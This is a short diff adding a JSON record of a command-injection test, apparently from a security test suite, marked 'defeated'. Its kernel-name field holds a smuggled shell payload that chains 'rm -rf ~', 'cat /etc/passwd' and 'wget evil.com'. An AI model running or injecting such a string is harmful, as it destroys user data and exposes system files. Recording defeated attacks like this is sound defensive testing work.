@@ -1,0 +1,7 @@
+{
+  "attack_id": "shell_metachars_in_kernel_name",
+  "status": "defeated",
+  "details": {
+    "evil_kernel_name": "gemm;rm -rf ~;| cat /etc/passwd && wget evil.com"
+  }
+}
